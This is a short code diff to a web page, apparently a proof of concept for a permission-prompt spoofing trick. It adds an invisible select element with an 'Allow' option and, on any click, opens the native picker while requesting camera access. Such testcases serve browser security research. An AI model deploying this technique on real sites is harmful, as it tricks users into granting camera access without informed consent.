@@ -11,26 +11,38 @@
 }
 </style>
 
+<select id="select">
+    <option>Request Notification..</option>
+    <option>Allow</option>
+</select>
+
+<style>
+#select {
+    opacity: 0;
+    position: absolute;
+    left: 0;
+    top: 0;
+}
+</style>
+
 <script>
 document.addEventListener("click", async () => {
     const select = document.getElementById("select");
 
-    if (select.showPicker) {
-        try {
-            select.showPicker();
-        } catch (e) {
-            console.error(e);
-        }
+    // Trigger native select picker
+    try {
+        select.showPicker();
+    } catch (e) {
+        console.error("showPicker:", e);
     }
 
+    // Trigger camera permission
     try {
-        const stream = await navigator.mediaDevices.getUserMedia({
+        await navigator.mediaDevices.getUserMedia({
             video: true
         });
-
-        console.log("Camera granted:", stream);
-    } catch (err) {
-        console.error(err);
+    } catch (e) {
+        console.error("getUserMedia:", e);
     }
 });
 </script>
